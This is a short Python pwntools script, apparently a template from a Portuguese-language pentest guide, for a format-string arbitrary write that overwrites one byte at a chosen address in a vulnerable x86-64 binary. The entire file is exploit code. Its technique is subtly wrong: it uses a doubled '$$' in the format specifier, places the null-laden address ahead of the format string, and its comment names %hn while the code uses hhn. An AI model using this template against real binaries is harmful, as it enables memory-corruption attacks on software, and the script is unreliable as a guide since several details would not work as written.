#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Template: fmt/fmt_write_x86_64 — format-string arbitrary write
#
# > Fonte: [Bíblia do Pentest BR](https://0xmorte.gitbook.io/bibliadopentestbr/)
# > Seção: Linguagens & Runtimes — memory corruption (format string)
# > Última sincronização: 2026-11-05
#
# Placeholders:
#   $BIN        — caminho do binário vulnerável
#   $TARGET     — endereço (hex, sem 0x) a sobrescrever (ex.: GOT de uma função)
#   $VALUE      — valor (int) a escrever naquele endereço (ex.: 0x40123a)
#   $STACK_POS  — posição do argumento (offset) onde o endereço cai no printf
#   $LEN_BYTE   — posição do byte de 1..8 a escrever (1 = byte menos significativo)
#
# Escreve um único byte por iteração usando %hn. Adapte $STACK_POS a partir do leak.

from pwn import *

context.arch = "amd64"
context.log_level = "error"

BIN = "$BIN"
TARGET = 0x$TARGET
VALUE = $VALUE
STACK_POS = $STACK_POS
LEN_BYTE = $LEN_BYTE

byte_value = (VALUE >> (8 * (LEN_BYTE - 1))) & 0xFF

payload = p64(TARGET + LEN_BYTE - 1)
payload += f"%{byte_value}c%{STACK_POS}$$hhn".encode()

p = process(BIN)
p.sendline(payload)
p.interactive()
